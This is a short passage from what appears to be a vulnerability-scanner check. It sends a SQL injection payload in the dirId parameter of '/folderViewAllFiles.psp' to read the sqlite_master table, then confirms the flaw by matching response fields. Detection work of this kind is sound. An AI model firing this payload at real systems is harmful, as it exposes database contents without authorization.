...
url = "/folderViewAllFiles.psp?start=0&count=60&url=%2F&dirId=\\'+union+select+null,name,null,sql,null,null" + "+from+sqlite_master+--+'";
if(http_vuln_check( port: port, url: url, pattern: "\"thumbUrl\"", check_header: TRUE, extra_check: "\"parentdirId\"" )){
